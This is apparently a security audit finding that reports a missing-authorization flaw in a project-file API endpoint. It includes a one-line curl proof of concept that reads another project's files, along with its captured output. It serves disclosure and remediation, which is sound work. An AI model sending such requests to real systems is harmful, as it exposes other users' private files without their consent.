# F-H-PROJFILES-1: Cross-project file read

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description
`GET /api/get-project-files` in `src/project.py:148-174` walks any existing project directory and returns every readable file's full text with no ownership binding.

## Impact
Unauthenticated client reads other projects' files.

## PoC
```bash
curl "http://<host>:1337/api/get-project-files?project_name=victim-project"
```

## Execution result
```
[PROJFILES] {"files":[{"code":"victim secret data 42\n","file":"SECRET.txt"}]}
```
